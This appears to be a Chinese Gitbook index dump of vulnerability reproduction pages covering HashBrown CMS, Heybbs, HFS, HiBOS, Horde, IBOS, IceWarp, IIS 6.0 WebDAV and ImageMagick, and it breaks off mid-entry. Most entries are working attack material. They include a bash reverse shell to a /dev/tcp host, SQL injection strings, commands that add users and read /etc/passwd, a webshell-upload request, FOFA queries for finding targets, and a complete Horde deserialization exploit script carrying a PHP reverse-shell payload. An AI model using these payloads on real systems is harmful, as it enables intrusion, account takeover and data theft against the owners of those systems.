Modify: 2021-07-15 19:53:38 "},"Web安全/Hashbrown CMS/（CVE-2020-6948）HashBrown CMS 远程命令执行漏洞/（CVE-2020-6948）HashBrown CMS 远程命令执行漏洞.html":{"url":"Web安全/Hashbrown CMS/（CVE-2020-6948）HashBrown CMS 远程命令执行漏洞/（CVE-2020-6948）HashBrown CMS 远程命令执行漏洞.html","title":"（CVE-2020-6948）HashBrown CMS 远程命令执行漏洞","keywords":"","body":"（CVE-2020-6948）HashBrown CMS 远程命令执行漏洞 一、漏洞简介 HashBrown CMS是一套开源的无头内容管理系统（CMS）。 HashBrown CMS 1.3.3及之前版本中存在远程代码执行漏洞，该漏洞源于程序没有进行正确的安全检查。攻击者可利用该漏洞执行代码。 二、漏洞影响 HashBrown CMS 1.3.3 三、复现过程 在之前收集的资料里面总结了发现漏洞基本有三个方法： 通过关键字搜索，比如exec方法在很多语言里面代表执行系统命令，那你就可以搜索查看传入exec方法的参数有没有经过过滤，有没有办法利用。https://github.com/wireghoul/graudit 这个项目就罗列了很多语言的关键词可以用作参考。 根据function来阅读代码，但是这种方法花费的时间比第一种多，有可能迷失在各种各种各样的方法中。 通读代码，这样最全，但是显然速度要慢很多了。 对于Hashbrown CMS，先用第一种方法开路。尝试了几个关键字之后我选取了exec这个关键字。在grep 之后发现了下面的结果。 HashBrownCMS远程命令执行漏洞/media/rId25.png) 看来这个应用使用git 相关命令，如果可以传入url 参数就有可能触发命令执行漏洞。接着打开Server/Entity/Deployer/GitDeployer.js 文件查看源代码。 HashBrownCMS远程命令执行漏洞/media/rId26.png) 其中可以看到url由username，password，和repro 几个变量拼接，而且其中没有过滤特殊的字符和命令。那接下来就是到页面里面寻找触发的点。经过对这个应用的一番熟悉，得知可以在登录后建立新的connection选择git部署的方式，在Repository，Branch，username或者password字段填写你要执行的命令即可。但是这里要注意程序本来的exec命令中填写有单引号，我们要对其进行闭合，比如填入如下命令来反弹一个shell。 https://google.com' & /bin/bash -c 'bash -i >& /dev/tcp/192.168.119.149/8888 0>&1 配置如下： HashBrownCMS远程命令执行漏洞/media/rId27.png) 然后点击media菜单触发git命令执行 HashBrownCMS远程命令执行漏洞/media/rId28.png) 接下来在监听的机器上就可以获得shell了 HashBrownCMS远程命令执行漏洞/media/rId29.png) 参考链接 https://mp.weixin.qq.com/s?__biz=MjM5MDYxODkyMA==&mid=2651345793&idx=1&sn=02381bb3dbd4679b12be4628d665e815&chksm=bdbef7c68ac97ed063e8df46a42e2a111dfd52f108f6b267f8dfc183b6b0ed3f87b6af757487&mpshare=1&scene=1&srcid=&sharer_sharetime=1582514363054&sharer_shareid=346bf064ccfaeb680ec3e1af3a4fc9a8&key=019d47c25aa835ac2d58a398c473737e01644761ca991f7009ada9eb1ef69e4dd41b2008c27db720006e0858455f920d0801d9feae53aa4314f05d6e310a7290ae2b93e17343c13f6a9f2ce360254195&ascene=1&uin=MTU0OTU5NDkzMA%3D%3D&devicetype=Windows+10&version=62080079&lang=zh_CN&exportkey=AZc%2BxZJwp8CueCtaKThWQrI%3D&pass_ticket=l4uNHDrGwGqrS%2BmJVv56i4FzemghweUeBbN1BEETCGd3TqEDSTcwvRMSxogubM8j Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:39 "},"Web安全/Hashbrown CMS/（CVE-2020-6949）HashBrown CMS postUser 函数存在提权漏洞/（CVE-2020-6949）HashBrown CMS postUser 函数存在提权漏洞.html":{"url":"Web安全/Hashbrown CMS/（CVE-2020-6949）HashBrown CMS postUser 函数存在提权漏洞/（CVE-2020-6949）HashBrown CMS postUser 函数存在提权漏洞.html","title":"（CVE-2020-6949）HashBrown CMS postUser 函数存在提权漏洞","keywords":"","body":"（CVE-2020-6949）HashBrown CMS postUser 函数存在提权漏洞 一、漏洞简介 HashBrown CMS是一套开源的无头内容管理系统（CMS）。 HashBrown CMS 1.3.3及之前版本中的'postUser'函数存在提权漏洞。攻击者可利用该漏洞修改管理员账户的哈希密码或重置该账户。 二、漏洞影响 HashBrown CMS 1.3.3及之前版本 三、复现过程 在读和部分此cms的源码后，希望对用户管理方面做个审计。这款CMS 的用户分为两种，一种是admin 权限用户， 可以创建和设置别的用户的属性，比如参管理那些项目，用户名密码设置等等。另外一种是editor 账户，其能管理哪些项目是由admin 设置的，editor 账户只能修改自己的用户名和密码。如下图这里的三个账户，admin 和 aaaa 是admin 用户，bbbb 是editor 账户 HashBrownCMSpostUser函数存在提权漏洞/media/rId24.png) 由于该CMS 不提供用户注册和找回密码的功能， 所以没有太多的地方可以去尝试突破，我就尝试聚焦有没有办法把editor 账户提权成admin 账户，那editor 账户只有一个地方可以修改自己的密码和其他属性。 HashBrownCMSpostUser函数存在提权漏洞/media/rId25.png) 随意做个修改后在burpsuit 截取请求如下。 POST http://10.200.159.166:8080/api/users/44019b092718ccde HTTP/1.1 Host: 10.200.159.166:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/json; charset=utf-8 Content-Length: 159 Cookie: token=2e10b7f6b3cc8fbf81452d980029d6e843ac5760 {\"id\":\"44019b092718ccde\",\"viewedBy\":\"\",\"viewedOn\":null,\"isAdmin\":false,\"isCurrent\":false,\"username\":\"bbbb\",\"fullName\":\"bbbb\",\"email\":\"\",\"theme\":\"\",\"scopes\":{}} Grep 定位到文件Server/Controller/UserController.js root@SIN-Ubuntu-A:~/hashbrown-cms/hashbrown-cms-1.3.1/src# grep /api/users/ * -r Server/Controller/UserController.js: app.get('/api/users/:id', this.middleware({needsAdmin: true, setProject: false}), this.getUser); Server/Controller/UserController.js: app.post('/api/users/first', this.createFirstAdmin); Server/Controller/UserController.js: app.post('/api/users/new', this.middleware({setProject: false, needsAdmin: true}), this.createUser); Server/Controller/UserController.js: app.post('/api/users/:id', this.middleware({setProject: false}), this.postUser); Server/Controller/UserController.js: app.delete('/api/users/:id', this.middleware({setProject: false, needsAdmin: true}), this.deleteUser); 其中的postUser function, 其中可看到该函数在151行会对cookie 里面的token 进行验证，在153 行获取user 的scope。Scope 这里指的就是是不是admin 用户，可以管理那些项目。但是这里有个要注意的地方148行的req.params.id 是post 内容里面json id字段的值，但是155行的user.id 是url 末段的id值。对于editor 用户来说应该永远一直，因为editor只能修改自己账户。Admin 用户有可能不一样，因为admin 用户是可修改其他账户的。我们可以看到156到159行是做了安全性检察的，如果当前user id 获取的属性没有users 的scope（不是admin 权限账户），那就用数据库里面的属性覆盖当前post提交内容的isAdmin 和scopes 两个内容，保证不会让editor 自己提权到admin 账户。到此没有看到对其他post 提交内容做检察。之后168行用查询id的方式对响应的条目做修改。 HashBrownCMSpostUser函数存在提权漏洞/media/rId26.png) 此时如果我们在数据库中查看的话可以有个更清晰的认识，如果第一个条目是aaaa账户，isadmin设置为true，第二个是admin账户，第三个是bbbb账户，每个账户password 字段包含hash，salt 和token字段。 HashBrownCMSpostUser函数存在提权漏洞/media/rId27.png) 这里我产生了一个想法，如果我是bbbb账户，提交修改自己账户请求的时候写入的是aaaa账户的id会发生什么样的事情呢？但是做这件事之前我们要先确定bbbb账户有没有办法得到aaaa账户的id。在阅读/Server/Controller/UserController.js源码后确实是可以的。如下31行，发送get 请求到API可以获取到当前项目的所有用户，包括所有的admin 账户。而项目id 等是当管理员赋予editor权限后，登录后从请求中就可以拿到的。 HashBrownCMSpostUser函数存在提权漏洞/media/rId28.png) 发送请求得到账户的信息。 HashBrownCMSpostUser函数存在提权漏洞/media/rId29.png) 那接下来我们就可以篡改bbbb发送修改自己账户的请求，但是post提交的id是aaaa账户。如下图保持了url最后一段是bbbb自己的id，post 提交的id是aaaa 账户，显示200 ok。 HashBrownCMSpostUser函数存在提权漏洞/media/rId30.png) 此时如果查看数据库会看到确实aaaa和bbbb 条目的id一样，但是bbbb 的内容并没有实际的改变，只是换了一个id。对别的账户也没有任何的修改。 HashBrownCMSpostUser函数存在提权漏洞/media/rId31.png) 但其实如果我们再深一步就会发现这有利用的点。在之前的源码中168行HashBrown.Service.UserService.updateUserById(id, properties); 使用了查询匹配id做修改的方式。我们追踪这个函数。在文件Server/Service/UserService.js中看到mergeOne的数据库操作方式。这意味这如果aaaa和bbbb有相同的id，但是aaaa 在数据库的前面位置，如果bbbb提出对这个id 的修改，修改会被接受但是写入aaaa的条目。 HashBrownCMSpostUser函数存在提权漏洞/media/rId32.png) 接下来我们来做测试,提交的ID全部改成aaaa账户的id，因为现在原始的bbbb的id已经不存在了。还提交了aaaa 的fullname 和password 字段修改其密码是和bbbb同样的内容。 HashBrownCMSpostUser函数存在提权漏洞/media/rId33.png) 结果如下，可以看到aaaa的条目修改后接受了fullname，和password，isadmin和scopes 继承了bbbb的内容，这是因为前面源码中的156到159行的作用。 HashBrownCMSpostUser函数存在提权漏洞/media/rId34.png) 到此为止，我们虽然不能将bbbb账户自己提升成admin，但是可以去修改别的账户的关键参数包括密码，这无疑是一个用户权限的漏洞。经过相似的分析修改username 可以达到类似的效果。随后我提交此漏洞，开发人员征求了我的意见以后保证无法修改成同样的id或者username 来规避了这个问题。 参考链接 https://mp.weixin.qq.com/s?__biz=MjM5MDYxODkyMA==&mid=2651345793&idx=1&sn=02381bb3dbd4679b12be4628d665e815&chksm=bdbef7c68ac97ed063e8df46a42e2a111dfd52f108f6b267f8dfc183b6b0ed3f87b6af757487&mpshare=1&scene=1&srcid=&sharer_sharetime=1582514363054&sharer_shareid=346bf064ccfaeb680ec3e1af3a4fc9a8&key=019d47c25aa835ac2d58a398c473737e01644761ca991f7009ada9eb1ef69e4dd41b2008c27db720006e0858455f920d0801d9feae53aa4314f05d6e310a7290ae2b93e17343c13f6a9f2ce360254195&ascene=1&uin=MTU0OTU5NDkzMA%3D%3D&devicetype=Windows+10&version=62080079&lang=zh_CN&exportkey=AZc%2BxZJwp8CueCtaKThWQrI%3D&pass_ticket=l4uNHDrGwGqrS%2BmJVv56i4FzemghweUeBbN1BEETCGd3TqEDSTcwvRMSxogubM8j Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:41 "},"Web安全/Heybbs/Heybbs 1.2 sql注入漏洞/Heybbs 1.2 sql注入漏洞.html":{"url":"Web安全/Heybbs/Heybbs 1.2 sql注入漏洞/Heybbs 1.2 sql注入漏洞.html","title":"Heybbs 1.2 sql注入漏洞","keywords":"","body":"Heybbs 1.2 sql注入漏洞 一、漏洞简介 二、漏洞影响 Heybb 1.2 三、复现过程 第一处注入存在于login.php文件的username参数处 POST /php/login.php HTTP/1.1 Host: www.0-sec.org Content-Length: 98 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://www.0-sec.org Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://www.0-sec.org/login.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=qmpkek4l3ojr30gtodf6nj4hp4 Connection: close username=123123' and (select 1 from (select(sleep(5)))accn) AND '1'='1&password=123123&verify=h4ir 将username标*放入sqlmap -r 第二处注入存在于user.php文件id参数处 Eg: http://www.0-sec.org/user.php?id=177 and 1=2 union select 1) ,user(),3,4,5,6,7,8,9,10 第三处注入存在于msg.php文件id参数处 Eg: http://www.0-sec.org/msg.php?id=1 and 1=2 union select 1) ,2,3,user(),5,6,7,8,9,10,11,12 Eg: http://www.0-sec.org/msg.php?id=1 and 1=2 union select 1) ,2,3,user(),5,6,7,8,9,10,11,12 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:43 "},"Web安全/Hfs/Hfs 远程命令执行漏洞/Hfs 远程命令执行漏洞.html":{"url":"Web安全/Hfs/Hfs 远程命令执行漏洞/Hfs 远程命令执行漏洞.html","title":"Hfs 远程命令执行漏洞","keywords":"","body":"Hfs 远程命令执行漏洞 一、漏洞简介 Rejetto HTTP File Server 2.3c及之前版本中的parserLib.pas文件中的'findMacroMarker'函数中存在安全漏洞，该漏洞源于parserLib.pas文件没有正确处理空字节。远程攻击者可借助搜索操作中的'%00'序列利用该漏洞执行任意程序。 二、漏洞影响 2.3c以前的2.3x版本 三、复现过程 http://www.0-sec.org:8080/?search==%00{.exec|cmd.exe /c [Command-String].} http://www.0-sec.org:8080/?search==%00{.exec|cmd.exe /c net user test1234 1234 /add.} Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:43 "},"Web安全/HiBOS酒店宽带运营系统/HiBOS酒店宽带运营系统RCE漏洞/HiBOS酒店宽带运营系统RCE漏洞.html":{"url":"Web安全/HiBOS酒店宽带运营系统/HiBOS酒店宽带运营系统RCE漏洞/HiBOS酒店宽带运营系统RCE漏洞.html","title":"HiBOS酒店宽带运营系统RCE漏洞","keywords":"","body":"HiBOS酒店宽带运营系统RCE漏洞 漏洞描述 HiBOS酒店宽带运营系统存在RCE漏洞，攻击者可以通过此漏洞执行任意命令。 漏洞影响 HiBOS酒店宽带运营系统 FOFA body=\"酒店宽带运营系统\" POC 登录界面如下 POC 执行命令输出etc/password内容到mb.txt http://xx.xx.xx.xx/manager/radius/server_ping.php?ip=127.0.0.1|cat /etc/passwd >../../mb.txt&id=1 然后访问http://xx.xx.xx.xx/mb.txt就可以看到了 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:44 "},"Web安全/Horde Groupware Webmail/Horde Groupware Webmail 远程命令执行漏洞/Horde Groupware Webmail 远程命令执行漏洞.html":{"url":"Web安全/Horde Groupware Webmail/Horde Groupware Webmail 远程命令执行漏洞/Horde Groupware Webmail 远程命令执行漏洞.html","title":"Horde Groupware Webmail 远程命令执行漏洞","keywords":"","body":"Horde Groupware Webmail 远程命令执行漏洞 一、漏洞简介 Horde Groupware Webmail是美国Horde公司的一套基于浏览器的企业级通信套件。Horde Groupware Webmail中存在代码注入漏洞。该漏洞源于外部输入数据构造代码段的过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段，修改网络系统或组件的预期的执行控制流。 二、漏洞影响 三、复现过程 saturn:~ mr_me$ ./poc.py (+) usage ./poc.py (+) eg: ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337 saturn:~ mr_me$ ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337 (+) targeting http://172.16.175.145/horde/ (+) obtained session iefankvohbl8og0mtaadm3efb6 (+) inserted our php object (+) triggering deserialization... (+) starting handler on port 1337 (+) connection from 172.16.175.145 (+) pop thy shell! id uid=33(www-data) gid=33(www-data) groups=33(www-data) pwd /var/www/horde/services uname -a Linux target 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 GNU/Linux exit *** Connection closed by remote host *** (+) repaired the target! poc.py #!/usr/bin/env python3 \"\"\" Horde Groupware Webmail Edition Sort sortpref Deserialization of Untrusted Data Remote Code Execution Vulnerability Identifiers: ZDI-CAN-10436 / ZDI-20-1051 Found by ..: mr_me Tested on .: Horde Groupware Webmail 5.2.22 (pear installation) on Debian 9 Stretch w/ Apache/2.4.25 & PHP 7.0.33 Summary: ======== It's possible to reach a deserialization of untrusted data vulnerability within the constructor of the IMP_Prefs_Sort class. A low privileged authenticated attacker can leverage this to achieve remote code execution. Example: ======== saturn:~ mr_me$ ./poc.py (+) usage ./poc.py (+) eg: ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337 saturn:~ mr_me$ ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337 (+) targeting http://172.16.175.145/horde/ (+) obtained session iefankvohbl8og0mtaadm3efb6 (+) inserted our php object (+) triggering deserialization... (+) starting handler on port 1337 (+) connection from 172.16.175.145 (+) pop thy shell! id uid=33(www-data) gid=33(www-data) groups=33(www-data) pwd /var/www/horde/services uname -a Linux target 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 GNU/Linux exit *** Connection closed by remote host *** (+) repaired the target! \"\"\" import re import sys import socket import requests import telnetlib import base64 from threading import Thread def rs(cbh, cbp): return \"\"\"@error_reporting(-1); @set_time_limit(0); @ignore_user_abort(1); $dis=@ini_get('disable_functions'); if(!empty($dis)){ $dis=preg_replace('/[, ]+/', ',', $dis); $dis=explode(',', $dis); $dis=array_map('trim', $dis); }else{ $dis=array(); } $ipaddr='%s'; $port=%d; function PtdSlhY($c){ global $dis; if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) { $c=$c.\" 2>&1\\\\n\"; } ob_start(); system($c); $o=ob_get_contents(); ob_end_clean(); if (strlen($o) === 0){ $o = \"NULL\"; } return $o; } $nofuncs='no exec functions'; $s=@fsockopen(\"tcp://$ipaddr\",$port); while($c=fread($s,2048)){ $out = ''; if(substr($c,0,3) == 'cd '){ chdir(substr($c,3,-1)); }else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') { break; }else{ $out=PtdSlhY(substr($c,0,-1)); if($out===false){ fwrite($s, $nofuncs); break; } } fwrite($s,$out); } fclose($s);\"\"\" % (cbh, cbp) def get_session(t, p, usr, pwd): uri = \"http://%s%slogin.php\" % (t, p) p = { \"login_post\" : 1337, \"horde_user\" : usr, \"horde_pass\" : pwd } r = requests.post(uri, data=p, allow_redirects=False) match = re.findall(\"Horde=(.{26});\", r.headers['set-cookie']) assert len(match) == 2, \"(-) failed to login\" return match[1] def trigger_deserialization(t, p, s, host, port): \"\"\" Object instantiation to reach the deserialization \"\"\" handlerthr = Thread(target=handler, args=(port,)) handlerthr.start() uri = \"http://%s%sservices/ajax.php/imp/imple\" % (t, p) p = { \"imple\" : \"IMP_Prefs_Sort\", \"app\" : \"imp\", } h = { \"cmd\" : base64.b64encode(rs(host, port).encode()) } c = { \"Horde\" : s } r = requests.get(uri, params=p, cookies=c, headers=h) match = re.search(\"horde_logout_token=(.*)&\", r.text) assert match, \"(-) failed to leak the horde_logout_token!\" p['token'] = match.group(1) r = requests.get(uri, params=p, cookies=c, headers=h) assert r.status_code == 200, \"(-) failed to trigger deserialization!\" def get_pop(): \"\"\" An updated pop chain \"\"\" pop = 'O:34:\"Horde_Kolab_Server_Decorator_Clean\":2:{' pop += 'S:43:\"\\\\00Horde_Kolab_Server_Decorator_Clean\\\\00_server\";O:20:\"Horde_Prefs_Identity\":3:{' pop += 'S:9:\"\\\\00*\\\\00_prefs\";O:11:\"Horde_Prefs\":2:{' pop += 'S:8:\"\\\\00*\\\\00_opts\";a:1:{' pop += 's:12:\"sizecallback\";a:2:{i:0;O:12:\"Horde_Config\":1:{' pop += 'S:13:\"\\\\00*\\\\00_oldConfig\";s:44:\"eval(base64_decode($_SERVER[HTTP_CMD]));die;\";' pop += '}i:1;s:13:\"readXMLConfig\";}}' pop += 'S:10:\"\\\\00*\\\\00_scopes\";a:1:{' pop += 's:5:\"horde\";C:17:\"Horde_Prefs_Scope\":10:{[null,[1]]}}}' # implements Serializable using custom unserialize/serialize pop += 'S:13:\"\\\\00*\\\\00_prefnames\";a:1:{s:10:\"identities\";i:0;}' pop += 'S:14:\"\\\\00*\\\\00_identities\";a:1:{i:0;i:0;}}' # additional checks pop += 'S:42:\"\\\\00Horde_Kolab_Server_Decorator_Clean\\\\00_added\";a:1:{i:0;i:0;}}' return pop def get_patch(): \"\"\" Our original array \"\"\" patch = 'a:1:{' patch += 's:5:\"INBOX\";a:1:{' patch += 's:1:\"b\";i:6;' patch += '}}' return patch def set_pref(t, p, s, k, o): \"\"\" A primitive that inserts a string into the database \"\"\" uri = \"http://%s%sservices/ajax.php/imp/setPrefValue\" % (t, p) p = { \"pref\" : k, \"value\" : o, } c = { \"Horde\" : s } r = requests.get(uri, params=p, cookies=c) match = re.search(\"horde_logout_token=(.*)&\", r.text) assert match, \"(-) failed to leak the horde_logout_token!\" p['token'] = match.group(1) r = requests.get(uri, params=p, cookies=c) assert (\"\\\"response\\\":true\" in r.text and r.status_code == 200), \"(-) failed to set the preference!\" def handler(lport): print(\"(+) starting handler on port %d\" % lport) t = telnetlib.Telnet() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((\"0.0.0.0\", lport)) s.listen(1) conn, addr = s.accept() print(\"(+) connection from %s\" % addr[0]) t.sock = conn print(\"(+) pop thy shell!\") t.interact() def fix_path(p): if p == \"/\": return p if not p.startswith(\"/\"): p = \"/%s\" % p if not p.endswith(\"/\"): p = \"%s/\" % p return p def main(): if len(sys.argv) \" % sys.argv[0]) print(\"(+) eg: %s 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337\" % sys.argv[0]) sys.exit(0) target = sys.argv[1] path = fix_path(sys.argv[2]) user = sys.argv[3].split(\":\")[0] pswd = sys.argv[3].split(\":\")[1] host = sys.argv[4].split(\":\")[0] port = int(sys.argv[4].split(\":\")[1]) print(\"(+) targeting http://%s%s\" % (target, path)) session = get_session(target, path, user, pswd) print(\"(+) obtained session %s\" % session) set_pref(target, path, session, 'sortpref', get_pop()) print(\"(+) inserted our php object\") print(\"(+) triggering deserialization...\") trigger_deserialization(target, path, session, host, port) set_pref(target, path, session, 'sortpref', get_patch()) print(\"(+) repaired the target!\") if __name__ == \"__main__\": main() Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:45 "},"Web安全/Hue/Hue 后台编辑器命令执行漏洞/Hue 后台编辑器命令执行漏洞.html":{"url":"Web安全/Hue/Hue 后台编辑器命令执行漏洞/Hue 后台编辑器命令执行漏洞.html","title":"Hue 后台编辑器命令执行漏洞","keywords":"","body":"Hue 后台编辑器命令执行漏洞 漏洞描述 Hue 后台编辑器存在命令执行漏洞，攻击者通过编辑上传 xxx.sh 文件即可达到命令执行的目的 漏洞影响 Hue 后台编辑器 FOFA title=\"Hue - 欢迎使用 Hue\" 漏洞复现 登录页面如下 上传并编辑文件为执行的命令 按如下步骤点击即可执行想要执行的命令 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:46 "},"Web安全/IBOS/IBOS 数据库模块 任意文件上传漏洞/IBOS 数据库模块 任意文件上传漏洞.html":{"url":"Web安全/IBOS/IBOS 数据库模块 任意文件上传漏洞/IBOS 数据库模块 任意文件上传漏洞.html","title":"IBOS 数据库模块 任意文件上传漏洞","keywords":"","body":"IBOS 数据库模块 任意文件上传漏洞 漏洞描述 IBOS 后台数据库模块 存在任意文件上传漏洞，攻击者进入后台后可以上传恶意文件控制服务器 漏洞影响 [!NOTE] IBOS FOFA [!NOTE] body=\"IBOS\" && body=\"login-panel\" 漏洞复现 登录页面如下 http://xxx.xxx.xxx.xxx/?r=dashboard/default/login 找到数据库备份模块 提交并抓包 修改filename参数发送包会上传peiqi.php文件到根目录 backuptype=all&custom_enabled=1&method=shell&sizelimit=2048&extendins=0&sqlcompat=MYSQL41&sqlcharset=utf8&usehex=0&usezip=0&filename=peiqi%26echo \"\">peiqi%PATHEXT:~0,1%php%26peiqi&dbSubmit=1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:47 "},"Web安全/ICEFlow/ICEFlow VPN 信息泄露漏洞/ICEFlow VPN 信息泄露漏洞.html":{"url":"Web安全/ICEFlow/ICEFlow VPN 信息泄露漏洞/ICEFlow VPN 信息泄露漏洞.html","title":"ICEFlow VPN 信息泄露漏洞","keywords":"","body":"ICEFlow VPN 信息泄露漏洞 漏洞描述 ICEFlow VPN 存在信息泄露漏洞，攻击者可以查看日志中的敏感数据来进一步攻击系统 漏洞影响 [!NOTE] ICEFlow VPN FOFA [!NOTE] title=\"ICEFLOW VPN Router\" 漏洞复现 可访问的日志 Url 系统日志 http://url/log/system.log VPN日志 http://url/log/vpn.log 访问日志 http://url/log/access.log 告警日志 http://url/log/warn.log 错误日志 http://url/log/error.log 调试日志 http://url/log1/debug.log 移动用户日志 http://url/log/mobile.log 防火墙日志 http://url/log/firewall.log 根据日志信息获得session后，可利用实时登录系统管理后台： http://xxx.xxx.xxx.xxx/cgi-bin/index?oid=10&session_id=xxxxxxxxxxxxxx&l=0 Goby & POC [!NOTE] ICEFlow VPN 信息泄露漏洞 参考文章 https://www.uedbox.com/post/18720/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:48 "},"Web安全/IceWarp WebClient basic/IceWarp WebClient basic 远程命令执行漏洞/IceWarp WebClient basic 远程命令执行漏洞.html":{"url":"Web安全/IceWarp WebClient basic/IceWarp WebClient basic 远程命令执行漏洞/IceWarp WebClient basic 远程命令执行漏洞.html","title":"IceWarp WebClient basic 远程命令执行漏洞","keywords":"","body":"IceWarp WebClient basic 远程命令执行漏洞 漏洞描述 IceWarp WebClient 存在远程命令执行漏洞，攻击者构造特殊的请求即可远程命令执行 漏洞影响 IceWarp WebClient FOFA app=\"IceWarp-公司产品\" 漏洞复现 登录页面如下 漏洞请求包为 POST /webmail/basic/ HTTP/1.1 Host: x.x.x.x Content-Type: application/x-www-form-urlencoded Cookie: use_cookies=1 Content-Length: 43 _dlg[captcha][target]=system(\\'ipconfig\\')\\ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:49 "},"Web安全/IIS/（CVE-2017-7269）IIS 6.0开启Webdav 缓存区溢出漏洞/（CVE-2017-7269）IIS 6.0开启Webdav 缓存区溢出漏洞.html":{"url":"Web安全/IIS/（CVE-2017-7269）IIS 6.0开启Webdav 缓存区溢出漏洞/（CVE-2017-7269）IIS 6.0开启Webdav 缓存区溢出漏洞.html","title":"（CVE-2017-7269）IIS 6.0开启Webdav 缓存区溢出漏洞","keywords":"","body":"（CVE-2017-7269）IIS 6.0开启Webdav 缓存区溢出漏洞 一、漏洞简介 IIS 6.0开启Webdav服务的服务器被爆存在缓存区溢出漏洞导致远程代码随意执行，目前针对 Windows Server 2003 R2 可以稳定利用。 二、漏洞影响 三、复现过程 环境搭建 目标主机：Windows Server 2003 R2镜像下载：种子文件用迅雷下载: ed2k://|file|cn_win_srv_2003_r2_enterprise_with_sp2_vl_cd1_X13-46432.iso|637917184|284DC0E76945125035B9208B9199E465|/ IP：192.168.1.104 A.安装IIS6.0服务： IIS6.0开启Webdav缓存区溢出漏洞/media/rId25.png) B.打开WebDAV服务拓展： IIS6.0开启Webdav缓存区溢出漏洞/media/rId26.png) 攻击机：kali Linux镜像下载：https://www.kali.org/downloads/IP:192.168.1.106 配置攻击套件 --首先我们要下载EXP文件，输入： git clone https://github.com/ianxtianxt/cve-2017-7269 //下载EXp ls //查看当前目录下的文件 IIS6.0开启Webdav缓存区溢出漏洞/media/rId28.png) --然后我们需要复制EXP到msf框架中#注意复制时，是下划线\"_\"不要写成cve-2017-7269.rb#，在目录下重命名这个文件为cve_2017_7269.rb，输入： cp cve_2017_7269.rb /usr/share/metasploit-framework/modules/exploits/windows/iis/ //复制EXP到相应目录 cd /usr/share/metasploit-framework/modules/exploits/windows/iis/ //进入目录 ls //查看当前目录下的文件 IIS6.0开启Webdav缓存区溢出漏洞/media/rId29.png) IIS6.0开启Webdav缓存区溢出漏洞/media/rId30.png) --我们使用nmap扫描一下靶机的端口情况，输入： nmap 192.168.1.104 //扫描192.168.1.104的端口 IIS6.0开启Webdav缓存区溢出漏洞/media/rId31.png) 可以看到我们要攻击的80端口已经开启# 利用msf开始攻击 IIS6.0开启Webdav缓存区溢出漏洞/media/rId33.png) --然后我们要使用刚才复制进去的EXP套件输入： msf5 > use exploit/windows/iis/cve_2017_7269 //使用此套件 msf5 > show options //查看需要的配置 发现只需要配置RHOSTS(目标IP)，最好把RPORT(目标端口)也配置下 IIS6.0开启Webdav缓存区溢出漏洞/media/rId34.png) msf5 > set rhosts 192.168.1.104 // 设置目标的IP msf5 > set rport 80 //设置目标端口 IIS6.0开启Webdav缓存区溢出漏洞/media/rId35.png) msf5 > exploit IIS6.0开启Webdav缓存区溢出漏洞/media/rId36.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:50 "},"Web安全/ImageMagick/（CVE-2016-3714）ImageMagick 命令执行漏洞/（CVE-2016-3714）ImageMagick 命令执行漏洞.html":{"url":"Web安全/ImageMagick/（CVE-2016-3714）ImageMagick 命令执行漏洞/（CVE-2016-3714）ImageMagick 命令执行漏洞.html","title":"（CVE-2016-3714）ImageMagick 命令执行漏洞","keywords":"","body":"（CVE-2016-3714）ImageMagick 命令执行漏洞 一、漏洞简介 /etc/ImageMagick/delegates.xml 将%s，%l加入到command里造成了命令执行 二、漏洞影响 ImageMagick 6.5.7-8 2012-08-17(手工测试风险存在) ImageMagick 6.7.7-10 2014-03-06(手工测试风险存在) 低版本至6.9.3-9 released 2016-04-30 三、复现过程 poc push graphic-context viewbox 0 0 640 480 fill 'url(https://\"| command\")' pop graphic-context 图片上传点，抓包，附上exp代码： push graphic-context viewbox 0 0 640 480 fill 'url(https://\"| curl 172.16.20.108:8888\")' pop graphic-context ip：你要反弹的shell地址，2333端口号，服务器监听反弹shell。 nc -lvp ``8888 image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:52 "},"Web安全/Imcat/ （CVE-2018-20606）Imcat 4.4 敏感信息泄露/ （CVE-2018-20606）Imcat 4.4 敏感信息泄露 .html":{"url":"Web安全/Imcat/ （CVE-2018-20606）Imcat 4.4 敏感信息泄露/ （CVE-2018-20606）Imcat 4.4 敏感信息泄露 .html","title":" （CVE-2018-20606）Imcat 4.4 敏感信息泄露 ","keywords":"","body":"（CVE-2018-20606）Imcat 4.4 